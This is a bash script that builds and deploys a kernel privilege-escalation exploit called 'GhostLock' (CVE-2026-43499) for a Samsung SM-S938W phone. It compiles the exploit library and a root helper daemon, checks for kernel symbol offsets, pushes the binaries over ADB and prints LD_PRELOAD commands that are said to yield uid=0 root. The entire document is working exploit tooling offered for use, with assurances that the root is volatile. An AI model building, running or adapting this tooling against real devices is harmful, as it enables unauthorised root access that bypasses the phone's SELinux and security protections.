#!/bin/bash
# Queen's Gambit — Build and Deploy GhostLock for SM-S938W
# JackKnife Studios, July 2026
#
# Prerequisites:
#   1. target.h filled with offsets from nm vmlinux
#   2. Phone connected via ADB
#   3. aarch64 toolchain available (NDK or Termux clang)
#
# This script:
#   1. Builds the exploit binaries
#   2. Pushes to phone
#   3. Sets permissions
#   4. Prints the execution command (does NOT auto-run)

set -e

echo "========================================="
echo "  QUEEN'S GAMBIT — GhostLock SM-S938W"
echo "========================================="
echo ""

# Check for PENDING offsets
if grep -q "PENDING" src/targets/pa3q-S938WVLS7BYLR/target.h; then
    echo "ERROR: target.h still has PENDING offsets!"
    echo "Run the offset extraction first:"
    echo "  nm vmlinux | grep -E 'init_task|selinux|ashmem|kmalloc'"
    echo ""
    grep "PENDING" src/targets/pa3q-S938WVLS7BYLR/target.h | head -5
    exit 1
fi

# Detect compiler
if [ -n "$ANDROID_NDK_HOME" ]; then
    CC="${ANDROID_NDK_HOME}/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
elif command -v aarch64-linux-gnu-gcc &>/dev/null; then
    CC="aarch64-linux-gnu-gcc"
elif command -v clang &>/dev/null && [ "$(uname -m)" = "aarch64" ]; then
    CC="clang"  # Native on phone
else
    echo "ERROR: No aarch64 compiler found"
    echo "Set ANDROID_NDK_HOME or install gcc-aarch64-linux-gnu"
    exit 1
fi

echo "Compiler: $CC"
echo "Target: SM-S938W (pa3q-S938WVLS7BYLR)"
echo ""

OUTDIR=build
mkdir -p $OUTDIR

echo "[1/2] Building exploit library..."
$CC -fPIC -O2 -g0 -Wall -Wextra \
    -Wno-unused-parameter -Wno-sign-compare \
    -Isrc \
    src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c \
    -shared -pthread -o $OUTDIR/cve-2026-43499

echo "[2/2] Building root helper..."
$CC -fPIE -pie -O2 -g0 -Wall -Wextra \
    src/su_daemon.c -o $OUTDIR/cve-2026-43499-root

echo ""
echo "Build complete:"
ls -lh $OUTDIR/cve-2026-43499 $OUTDIR/cve-2026-43499-root
echo ""

# Check ADB
if ! adb devices | grep -q device$; then
    echo "WARNING: No ADB device connected"
    echo "Connect phone and re-run deployment step"
    exit 0
fi

echo "[3/4] Pushing to phone..."
adb push $OUTDIR/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push $OUTDIR/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root

echo "[4/4] Setting permissions..."
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root

echo ""
echo "========================================="
echo "  READY TO EXECUTE"
echo "========================================="
echo ""
echo "To run (volatile root until reboot):"
echo ""
echo '  adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"'
echo '  adb shell "/data/local/tmp/cve-2026-43499-root -c id"'
echo ""
echo "To verify root:"
echo '  adb shell "/data/local/tmp/cve-2026-43499-root -c id"'
echo "  Expected: uid=0(root)"
echo ""
echo "SAFETY: Root is volatile — reboot clears everything."
echo "        Stock firmware untouched. Knox eFuse unburned."
echo "========================================="
